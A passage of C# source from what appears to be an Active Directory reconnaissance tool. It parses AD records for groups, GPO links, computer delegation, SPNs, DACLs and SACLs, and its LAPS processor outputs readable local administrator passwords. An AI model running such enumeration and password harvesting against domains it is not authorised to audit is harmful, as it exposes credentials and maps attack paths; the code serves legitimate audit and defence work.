            {
                try
                {
                    // based on https://github.com/BloodHoundAD/BloodHound/blob/master/PowerShell/BloodHound.ps1
                    PSObject AdGroup = (PSObject) record;
                    List<PSObject> GroupsList = new List<PSObject>();
                    string SamAccountType = Convert.ToString(AdGroup.Members["samaccounttype"].Value);
                    string AccountType = "";
                    string GroupName = "";
                    string MemberUserName = "-";
                    string MemberName = "";

                    if (Groups.Contains(SamAccountType))
                    {
                        AccountType = "group";
                        MemberName = ((Convert.ToString(AdGroup.Members["DistinguishedName"].Value)).Split(',')[0]).Split('=')[1];
                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdGroup.Members["memberof"].Value;
                        if (MemberGroups.Value != null)
                        {
                            if (MemberGroups.Value is System.String[])
                            {
                                foreach (String GroupMember in (System.String[])MemberGroups.Value)
                                {
                                    GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                                    PSObject GroupMemberObj = new PSObject();
                                    GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                                    GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                                    GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                                    GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                                    GroupsList.Add( GroupMemberObj );
                                }
                            }
                            else
                            {
                                GroupName = (Convert.ToString(MemberGroups.Value).Split(',')[0]).Split('=')[1];
                                PSObject GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
                    }
                    if (Users.Contains(SamAccountType))
                    {
                        AccountType = "user";
                        MemberName = ((Convert.ToString(AdGroup.Members["DistinguishedName"].Value)).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Members["sAMAccountName"].Value);
                        String PrimaryGroupID = Convert.ToString(AdGroup.Members["primaryGroupID"].Value);
                        try
                        {
                            GroupName = ADWSClass.AdGroupDictionary[ADWSClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("{0} Exception caught.", e);
                            GroupName = PrimaryGroupID;
                        }

                        {
                            PSObject GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }

                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdGroup.Members["memberof"].Value;
                        if (MemberGroups.Value != null)
                        {
                            if (MemberGroups.Value is System.String[])
                            {
                                foreach (String GroupMember in (System.String[])MemberGroups.Value)
                                {
                                    GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                                    PSObject GroupMemberObj = new PSObject();
                                    GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                                    GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                                    GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                                    GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                                    GroupsList.Add( GroupMemberObj );
                                }
                            }
                            else
                            {
                                GroupName = (Convert.ToString(MemberGroups.Value).Split(',')[0]).Split('=')[1];
                                PSObject GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
                    }
                    if (Computers.Contains(SamAccountType))
                    {
                        AccountType = "computer";
                        MemberName = ((Convert.ToString(AdGroup.Members["DistinguishedName"].Value)).Split(',')[0]).Split('=')[1];
                        MemberUserName = Convert.ToString(AdGroup.Members["sAMAccountName"].Value);
                        String PrimaryGroupID = Convert.ToString(AdGroup.Members["primaryGroupID"].Value);
                        try
                        {
                            GroupName = ADWSClass.AdGroupDictionary[ADWSClass.DomainSID + "-" + PrimaryGroupID];
                        }
                        catch //(Exception e)
                        {
                            //Console.WriteLine("{0} Exception caught.", e);
                            GroupName = PrimaryGroupID;
                        }

                        {
                            PSObject GroupMemberObj = new PSObject();
                            GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                            GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                            GroupsList.Add( GroupMemberObj );
                        }

                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberGroups = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdGroup.Members["memberof"].Value;
                        if (MemberGroups.Value != null)
                        {
                            if (MemberGroups.Value is System.String[])
                            {
                                foreach (String GroupMember in (System.String[])MemberGroups.Value)
                                {
                                    GroupName = ((Convert.ToString(GroupMember)).Split(',')[0]).Split('=')[1];
                                    PSObject GroupMemberObj = new PSObject();
                                    GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                                    GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                                    GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                                    GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                                    GroupsList.Add( GroupMemberObj );
                                }
                            }
                            else
                            {
                                GroupName = (Convert.ToString(MemberGroups.Value).Split(',')[0]).Split('=')[1];
                                PSObject GroupMemberObj = new PSObject();
                                GroupMemberObj.Members.Add(new PSNoteProperty("Group Name", GroupName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member UserName", MemberUserName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("Member Name", MemberName));
                                GroupMemberObj.Members.Add(new PSNoteProperty("AccountType", AccountType));
                                GroupsList.Add( GroupMemberObj );
                            }
                        }
                    }
                    if (TrustAccounts.Contains(SamAccountType))
                    {
                        // TO DO
                    }
                    return GroupsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class OURecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdOU = (PSObject) record;
                    PSObject OUObj = new PSObject();
                    OUObj.Members.Add(new PSNoteProperty("Name", AdOU.Members["Name"].Value));
                    OUObj.Members.Add(new PSNoteProperty("Depth", ((Convert.ToString(AdOU.Members["DistinguishedName"].Value).Split(new string[] { "OU=" }, StringSplitOptions.None)).Length -1)));
                    OUObj.Members.Add(new PSNoteProperty("Description", AdOU.Members["Description"].Value));
                    OUObj.Members.Add(new PSNoteProperty("whenCreated", AdOU.Members["whenCreated"].Value));
                    OUObj.Members.Add(new PSNoteProperty("whenChanged", AdOU.Members["whenChanged"].Value));
                    OUObj.Members.Add(new PSNoteProperty("DistinguishedName", AdOU.Members["DistinguishedName"].Value));
                    return new PSObject[] { OUObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGPO = (PSObject) record;

                    PSObject GPOObj = new PSObject();
                    GPOObj.Members.Add(new PSNoteProperty("DisplayName", CleanString(AdGPO.Members["DisplayName"].Value)));
                    GPOObj.Members.Add(new PSNoteProperty("GUID", CleanString(AdGPO.Members["Name"].Value)));
                    GPOObj.Members.Add(new PSNoteProperty("whenCreated", AdGPO.Members["whenCreated"].Value));
                    GPOObj.Members.Add(new PSNoteProperty("whenChanged", AdGPO.Members["whenChanged"].Value));
                    GPOObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdGPO.Members["DistinguishedName"].Value)));
                    GPOObj.Members.Add(new PSNoteProperty("FilePath", AdGPO.Members["gPCFileSysPath"].Value));
                    return new PSObject[] { GPOObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class GPORecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGPO = (PSObject) record;
                    ADWSClass.AdGPODictionary.Add((Convert.ToString(AdGPO.Members["DistinguishedName"].Value).ToUpper()), (Convert.ToString(AdGPO.Members["DisplayName"].Value)));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class SOMRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdSOM = (PSObject) record;
                    List<PSObject> SOMsList = new List<PSObject>();
                    int Depth = 0;
                    bool BlockInheritance = false;
                    bool? LinkEnabled = null;
                    bool? Enforced = null;
                    String gPLink = Convert.ToString(AdSOM.Members["gPLink"].Value);
                    String GPOName = null;

                    Depth = (Convert.ToString(AdSOM.Members["DistinguishedName"].Value).Split(new string[] { "OU=" }, StringSplitOptions.None)).Length -1;
                    if (AdSOM.Members["gPOptions"].Value != null && (int) AdSOM.Members["gPOptions"].Value == 1)
                    {
                        BlockInheritance = true;
                    }
                    var GPLinks = gPLink.Split(']', '[').Where(x => x.StartsWith("LDAP"));
                    int Order = (GPLinks.ToArray()).Length;
                    if (Order == 0)
                    {
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty("Name", AdSOM.Members["Name"].Value));
                        SOMObj.Members.Add(new PSNoteProperty("Depth", Depth));
                        SOMObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSOM.Members["DistinguishedName"].Value));
                        SOMObj.Members.Add(new PSNoteProperty("Link Order", null));
                        SOMObj.Members.Add(new PSNoteProperty("GPO", GPOName));
                        SOMObj.Members.Add(new PSNoteProperty("Enforced", Enforced));
                        SOMObj.Members.Add(new PSNoteProperty("Link Enabled", LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty("BlockInheritance", BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty("gPLink", gPLink));
                        SOMObj.Members.Add(new PSNoteProperty("gPOptions", AdSOM.Members["gPOptions"].Value));
                        SOMsList.Add( SOMObj );
                    }
                    foreach (String link in GPLinks)
                    {
                        String[] linksplit = link.Split('/', ';');
                        if (!Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 1)))
                        {
                            LinkEnabled = true;
                        }
                        else
                        {
                            LinkEnabled = false;
                        }
                        if (Convert.ToBoolean((Convert.ToInt32(linksplit[3]) & 2)))
                        {
                            Enforced = true;
                        }
                        else
                        {
                            Enforced = false;
                        }
                        GPOName = ADWSClass.AdGPODictionary.ContainsKey(linksplit[2].ToUpper()) ? ADWSClass.AdGPODictionary[linksplit[2].ToUpper()] : linksplit[2].Split('=',',')[1];
                        PSObject SOMObj = new PSObject();
                        SOMObj.Members.Add(new PSNoteProperty("Name", AdSOM.Members["Name"].Value));
                        SOMObj.Members.Add(new PSNoteProperty("Depth", Depth));
                        SOMObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSOM.Members["DistinguishedName"].Value));
                        SOMObj.Members.Add(new PSNoteProperty("Link Order", Order));
                        SOMObj.Members.Add(new PSNoteProperty("GPO", GPOName));
                        SOMObj.Members.Add(new PSNoteProperty("Enforced", Enforced));
                        SOMObj.Members.Add(new PSNoteProperty("Link Enabled", LinkEnabled));
                        SOMObj.Members.Add(new PSNoteProperty("BlockInheritance", BlockInheritance));
                        SOMObj.Members.Add(new PSNoteProperty("gPLink", gPLink));
                        SOMObj.Members.Add(new PSNoteProperty("gPOptions", AdSOM.Members["gPOptions"].Value));
                        SOMsList.Add( SOMObj );
                        Order--;
                    }
                    return SOMsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class PrinterRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdPrinter = (PSObject) record;

                    PSObject PrinterObj = new PSObject();
                    PrinterObj.Members.Add(new PSNoteProperty("Name", AdPrinter.Members["Name"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("ServerName", AdPrinter.Members["serverName"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("ShareName", ((Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) (AdPrinter.Members["printShareName"].Value)).Value));
                    PrinterObj.Members.Add(new PSNoteProperty("DriverName", AdPrinter.Members["driverName"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("DriverVersion", AdPrinter.Members["driverVersion"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("PortName", ((Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) (AdPrinter.Members["portName"].Value)).Value));
                    PrinterObj.Members.Add(new PSNoteProperty("URL", ((Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) (AdPrinter.Members["url"].Value)).Value));
                    PrinterObj.Members.Add(new PSNoteProperty("whenCreated", AdPrinter.Members["whenCreated"].Value));
                    PrinterObj.Members.Add(new PSNoteProperty("whenChanged", AdPrinter.Members["whenChanged"].Value));
                    return new PSObject[] { PrinterObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdComputer = (PSObject) record;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    bool Dormant = false;
                    bool PasswordNotChangedafterMaxAge = false;
                    String SIDHistory = "";
                    String DelegationType = null;
                    String DelegationProtocol = null;
                    String DelegationServices = null;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;

                    if (AdComputer.Members["LastLogonDate"].Value != null)
                    {
                        //LastLogonDate = DateTime.FromFileTime((long)(AdComputer.Members["lastLogonTimeStamp"].Value));
                        // LastLogonDate is lastLogonTimeStamp converted to local time
                        LastLogonDate = Convert.ToDateTime(AdComputer.Members["LastLogonDate"].Value);
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    if (AdComputer.Members["PasswordLastSet"].Value != null)
                    {
                        //PasswordLastSet = DateTime.FromFileTime((long)(AdComputer.Members["pwdLastSet"].Value));
                        // PasswordLastSet is pwdLastSet converted to local time
                        PasswordLastSet = Convert.ToDateTime(AdComputer.Members["PasswordLastSet"].Value);
                        DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                        if (DaysSinceLastPasswordChange > PassMaxAge)
                        {
                            PasswordNotChangedafterMaxAge = true;
                        }
                    }
                    if ( ((bool) AdComputer.Members["TrustedForDelegation"].Value) && ((int) AdComputer.Members["primaryGroupID"].Value == 515) )
                    {
                        DelegationType = "Unconstrained";
                        DelegationServices = "Any";
                    }
                    if (AdComputer.Members["msDS-AllowedToDelegateTo"] != null)
                    {
                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection delegateto = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdComputer.Members["msDS-AllowedToDelegateTo"].Value;
                        if (delegateto.Value != null)
                        {
                            DelegationType = "Constrained";
                            if (delegateto.Value is System.String[])
                            {
                                foreach (var value in (String[]) delegateto.Value)
                                {
                                    DelegationServices = DelegationServices + "," + Convert.ToString(value);
                                }
                                DelegationServices = DelegationServices.TrimStart(',');
                            }
                            else
                            {
                                DelegationServices = Convert.ToString(delegateto.Value);
                            }
                        }
                    }
                    if ((bool) AdComputer.Members["TrustedToAuthForDelegation"].Value)
                    {
                        DelegationProtocol = "Any";
                    }
                    else if (DelegationType != null)
                    {
                        DelegationProtocol = "Kerberos";
                    }
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection history = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdComputer.Members["SIDHistory"].Value;
                    if (history.Value is System.Security.Principal.SecurityIdentifier[])
                    {
                        string sids = "";
                        foreach (var value in (SecurityIdentifier[]) history.Value)
                        {
                            sids = sids + "," + Convert.ToString(value);
                        }
                        SIDHistory = sids.TrimStart(',');
                    }
                    else
                    {
                        SIDHistory = history != null ? Convert.ToString(history.Value) : "";
                    }
                    String OperatingSystem = CleanString((AdComputer.Members["OperatingSystem"].Value != null ? AdComputer.Members["OperatingSystem"].Value : "-") + " " + AdComputer.Members["OperatingSystemHotfix"].Value + " " + AdComputer.Members["OperatingSystemServicePack"].Value + " " + AdComputer.Members["OperatingSystemVersion"].Value);

                    PSObject ComputerObj = new PSObject();
                    ComputerObj.Members.Add(new PSNoteProperty("Name", AdComputer.Members["Name"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("DNSHostName", AdComputer.Members["DNSHostName"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Enabled", AdComputer.Members["Enabled"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("IPv4Address", AdComputer.Members["IPv4Address"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Operating System", OperatingSystem));
                    ComputerObj.Members.Add(new PSNoteProperty("Logon Age (days)", DaysSinceLastLogon));
                    ComputerObj.Members.Add(new PSNoteProperty("Password Age (days)", DaysSinceLastPasswordChange));
                    ComputerObj.Members.Add(new PSNoteProperty("Dormant (> " + DormantTimeSpan + " days)", Dormant));
                    ComputerObj.Members.Add(new PSNoteProperty("Password Age (> " + PassMaxAge + " days)", PasswordNotChangedafterMaxAge));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Type", DelegationType));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Protocol", DelegationProtocol));
                    ComputerObj.Members.Add(new PSNoteProperty("Delegation Services", DelegationServices));
                    ComputerObj.Members.Add(new PSNoteProperty("UserName", AdComputer.Members["SamAccountName"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Primary Group ID", AdComputer.Members["primaryGroupID"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("SID", AdComputer.Members["SID"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    ComputerObj.Members.Add(new PSNoteProperty("Description", AdComputer.Members["Description"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("ms-ds-CreatorSid", AdComputer.Members["ms-ds-CreatorSid"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Last Logon Date", LastLogonDate));
                    ComputerObj.Members.Add(new PSNoteProperty("Password LastSet", PasswordLastSet));
                    ComputerObj.Members.Add(new PSNoteProperty("UserAccountControl", AdComputer.Members["UserAccountControl"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("whenCreated", AdComputer.Members["whenCreated"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("whenChanged", AdComputer.Members["whenChanged"].Value));
                    ComputerObj.Members.Add(new PSNoteProperty("Distinguished Name", AdComputer.Members["DistinguishedName"].Value));
                    return new PSObject[] { ComputerObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdComputer = (PSObject) record;
                    List<PSObject> SPNList = new List<PSObject>();

                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection SPNs = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdComputer.Members["servicePrincipalName"].Value;
                    if (SPNs.Value is System.String[])
                    {
                        foreach (String SPN in (System.String[])SPNs.Value)
                        {
                            bool flag = true;
                            String[] SPNArray = SPN.Split('/');
                            foreach (PSObject Obj in SPNList)
                            {
                                if ( (String) Obj.Members["Service"].Value == SPNArray[0] )
                                {
                                    Obj.Members["Host"].Value = String.Join(",", (Obj.Members["Host"].Value + "," + SPNArray[1]).Split(',').Distinct().ToArray());
                                    flag = false;
                                }
                            }
                            if (flag)
                            {
                                PSObject ComputerSPNObj = new PSObject();
                                ComputerSPNObj.Members.Add(new PSNoteProperty("Name", AdComputer.Members["Name"].Value));
                                ComputerSPNObj.Members.Add(new PSNoteProperty("Service", SPNArray[0]));
                                ComputerSPNObj.Members.Add(new PSNoteProperty("Host", SPNArray[1]));
                                SPNList.Add( ComputerSPNObj );
                            }
                        }
                    }
                    else
                    {
                        String[] SPNArray = Convert.ToString(SPNs.Value).Split('/');
                        PSObject ComputerSPNObj = new PSObject();
                        ComputerSPNObj.Members.Add(new PSNoteProperty("Name", AdComputer.Members["Name"].Value));
                        ComputerSPNObj.Members.Add(new PSNoteProperty("Service", SPNArray[0]));
                        ComputerSPNObj.Members.Add(new PSNoteProperty("Host", SPNArray[1]));
                        SPNList.Add( ComputerSPNObj );
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class LAPSRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdComputer = (PSObject) record;
                    bool PasswordStored = false;
                    DateTime? CurrentExpiration = null;
                    try
                    {
                        CurrentExpiration = DateTime.FromFileTime((long)(AdComputer.Members["ms-Mcs-AdmPwdExpirationTime"].Value));
                        PasswordStored = true;
                    }
                    catch //(Exception e)
                    {
                        //Console.WriteLine("{0} Exception caught.", e);
                    }
                    PSObject LAPSObj = new PSObject();
                    LAPSObj.Members.Add(new PSNoteProperty("Hostname", (AdComputer.Members["DNSHostName"].Value != null ? AdComputer.Members["DNSHostName"].Value : AdComputer.Members["CN"].Value )));
                    LAPSObj.Members.Add(new PSNoteProperty("Stored", PasswordStored));
                    LAPSObj.Members.Add(new PSNoteProperty("Readable", (AdComputer.Members["ms-Mcs-AdmPwd"].Value != null ? true : false)));
                    LAPSObj.Members.Add(new PSNoteProperty("Password", AdComputer.Members["ms-Mcs-AdmPwd"].Value));
                    LAPSObj.Members.Add(new PSNoteProperty("Expiration", CurrentExpiration));
                    return new PSObject[] { LAPSObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class SIDRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdObject = (PSObject) record;
                    switch (Convert.ToString(AdObject.Members["ObjectClass"].Value))
                    {
                        case "user":
                        case "computer":
                        case "group":
                            ADWSClass.AdSIDDictionary.Add(Convert.ToString(AdObject.Members["objectsid"].Value), Convert.ToString(AdObject.Members["Name"].Value));
                            break;
                    }
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} {1} Exception caught.", ((PSObject) record).Members["ObjectClass"].Value, e);
                    return new PSObject[] { };
                }
            }
        }

        class DACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdObject = (PSObject) record;
                    String Name = null;
                    String Type = null;
                    List<PSObject> DACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Members["Name"].Value);

                    switch (Convert.ToString(AdObject.Members["objectClass"].Value))
                    {
                        case "user":
                            Type = "User";
                            break;
                        case "computer":
                            Type = "Computer";
                            break;
                        case "group":
                            Type = "Group";
                            break;
                        case "container":
                            Type = "Container";
                            break;
                        case "groupPolicyContainer":
                            Type = "GPO";
                            Name = Convert.ToString(AdObject.Members["DisplayName"].Value);
                            break;
                        case "organizationalUnit":
                            Type = "OU";
                            break;
                        case "domainDNS":
                            Type = "Domain";
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Members["objectClass"].Value);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Members["ntsecuritydescriptor"] != null)
                    {
                        DirectoryObjectSecurity DirObjSec = (DirectoryObjectSecurity) AdObject.Members["ntsecuritydescriptor"].Value;
                        AuthorizationRuleCollection AccessRules = (AuthorizationRuleCollection) DirObjSec.GetAccessRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAccessRule Rule in AccessRules)
                        {
                            String IdentityReference = Convert.ToString(Rule.IdentityReference);
                            String Owner = Convert.ToString(DirObjSec.GetOwner(typeof(System.Security.Principal.SecurityIdentifier)));
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty("Name", CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty("Type", Type));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectTypeName", ADWSClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectTypeName", ADWSClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("ActiveDirectoryRights", Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty("AccessControlType", Rule.AccessControlType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReferenceName", ADWSClass.AdSIDDictionary.ContainsKey(IdentityReference) ? ADWSClass.AdSIDDictionary[IdentityReference] : IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("OwnerName", ADWSClass.AdSIDDictionary.ContainsKey(Owner) ? ADWSClass.AdSIDDictionary[Owner] : Owner));
                            ObjectObj.Members.Add(new PSNoteProperty("Inherited", Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectFlags", Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceFlags", Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceType", Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty("PropagationFlags", Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectType", Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectType", Rule.InheritedObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReference", Rule.IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("Owner", Owner));
                            ObjectObj.Members.Add(new PSNoteProperty("DistinguishedName", AdObject.Members["DistinguishedName"].Value));
                            DACLList.Add( ObjectObj );
                        }
                    }

                    return DACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

    class SACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdObject = (PSObject) record;
                    String Name = null;
                    String Type = null;
                    List<PSObject> SACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Members["Name"].Value);

                    switch (Convert.ToString(AdObject.Members["objectClass"].Value))
                    {
                        case "user":
                            Type = "User";
                            break;
                        case "computer":
                            Type = "Computer";
                            break;
                        case "group":
                            Type = "Group";
                            break;
                        case "container":
                            Type = "Container";
                            break;
                        case "groupPolicyContainer":
                            Type = "GPO";
                            Name = Convert.ToString(AdObject.Members["DisplayName"].Value);
                            break;
                        case "organizationalUnit":
                            Type = "OU";
                            break;
                        case "domainDNS":
                            Type = "Domain";
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Members["objectClass"].Value);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Members["ntsecuritydescriptor"] != null)
                    {
                        DirectoryObjectSecurity DirObjSec = (DirectoryObjectSecurity) AdObject.Members["ntsecuritydescriptor"].Value;
                        AuthorizationRuleCollection AuditRules = (AuthorizationRuleCollection) DirObjSec.GetAuditRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAuditRule Rule in AuditRules)
                        {
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty("Name", CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty("Type", Type));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectTypeName", ADWSClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectTypeName", ADWSClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("ActiveDirectoryRights", Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReference", Rule.IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("AuditFlags", Rule.AuditFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectFlags", Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceFlags", Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceType", Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty("Inherited", Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty("PropagationFlags", Rule.PropagationFlags));
